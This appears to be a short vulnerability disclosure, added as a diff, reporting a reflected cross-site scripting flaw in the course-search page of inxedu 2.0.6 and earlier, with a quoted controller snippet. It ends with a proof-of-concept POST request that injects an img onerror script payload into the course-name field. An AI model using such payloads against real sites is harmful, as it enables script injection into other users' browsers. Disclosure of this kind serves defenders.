@@ -1,0 +1,31 @@
+# By Li Zaitang
+
+XSS：
+    
+    On the search course list page, the user directly displays the input content on the page without verification, resulting in an XSS vulnerability.
+
+'''
+
+
+Source:
+      /src/main/java/com/inxedu/os/edu/controller/course/CourseController.java:71-80
+
+        try {
+        	model.setViewName(showCourseList);
+            // 页面传来的数据放到page中
+        	page.setPageSize(12);
+            //只查询上架的
+            queryCourse.setIsavaliable(1);
+            // 搜索课程列表
+            List<CourseDto> courseList = courseService.queryWebCourseListPage(queryCourse, page);
+            model.addObject("courseList", courseList);
+
+	Affected software:inxedu <= 2.0.6
+	Software Link: http://175.6.244.211:88/uploads/userup/2457/inxeduopen-inxedu-master.zip
+
+'''
+
+exploit:
+http://127.0.0.1:7788/front/showcoulist
+POST 
+queryCourse.courseName="><img src=x onerror=alert(1)>
